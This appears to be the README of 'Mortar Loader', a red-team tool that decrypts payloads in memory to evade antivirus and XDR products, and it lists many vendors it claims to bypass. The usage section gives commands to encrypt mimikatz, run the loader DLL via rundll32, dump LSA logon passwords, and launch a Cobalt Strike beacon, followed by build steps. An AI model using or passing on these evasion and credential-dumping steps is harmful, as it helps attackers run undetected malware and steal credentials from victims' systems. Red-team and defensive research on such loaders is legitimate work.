# Mortar Loader 

red teaming evasion technique to defeat and divert detection and prevention of security products.Mortar Loader performs encryption and decryption of selected binary inside the memory streams and execute it directly with out writing any malicious indicator into the hard-drive. 
Mortar is able to bypass modern anti-virus products and advanced XDR solutions and it has been tested and confirmed bypass for the following: 

* Kaspersky :heavy_check_mark:
* ESET :heavy_check_mark:
* Malewarebytes :heavy_check_mark:
* Mcafee :heavy_check_mark:
* Windows defender :exclamation:
* Cylance:heavy_check_mark:
* TrendMicro :heavy_check_mark:
* Bitdefender :heavy_check_mark:
* Norton Symantec :heavy_check_mark:
* Sophos :heavy_check_mark:

detailed research and techniques : https://0xsp.com/security%20research%20&%20development%20(SRD)/defeat-the-castle-bypass-av-advanced-xdr-solutions

Mortar Loader v2 features : https://0xsp.com/offensive/mortar-loader-v2/

CrestCon Asia 2021 talk : https://www.youtube.com/watch?v=H7EMBz7GLMk

# Usage 

## Encryptor 

```
root@kali>./encryptor -f mimikatz.exe -o bin.enc 

```

## Loader (DLL)

directly execute the agressor.dll using rundll32 or any DLL injection technique you prefer 

```
rundll32.exe agressor.dll,start
```

for shellcode running 
```
rundll32 agressor.dll,sh
```
## Loader (EXE) ( HAS BEEN REMOVED IN V2)
the executable version has more options you can use, as you able to pass commands for the loaded binary

```
##Mimikatz dump LSA 
deliver.exe -d -c sekurlsa::logonpasswords -f mimikatz.enc 

## Cobalt strike beacon 
deliver.exe -d -f cobalt.enc 

```
# Compiling the Loader (windows only)
the project has been coded using FPC(Free Pascal), the compiling procedures are straightforward by downloading and installing Lazarus IDE (https://www.lazarus-ide.org/index.php?page=downloads).


# Compiling Encryptor(Linux/BSD/Arm/MacOS//windows)
either by downloading and installing Lazarus-IDE from the official site(https://www.lazarus-ide.org/index.php?page=downloads)

```
#Debian & Ubuntu 

apt install fpc 
apt install lazarus-ide 

```
# Support the research 
if you think you have benefited from this open-source project and want more updates in the future, please mind time and efforts by making a donation
https://donorbox.org/support-0xsp

# sponsor ?
- you show continues appreciation of my work
- you will get early access into private repos and get support for any raise issue






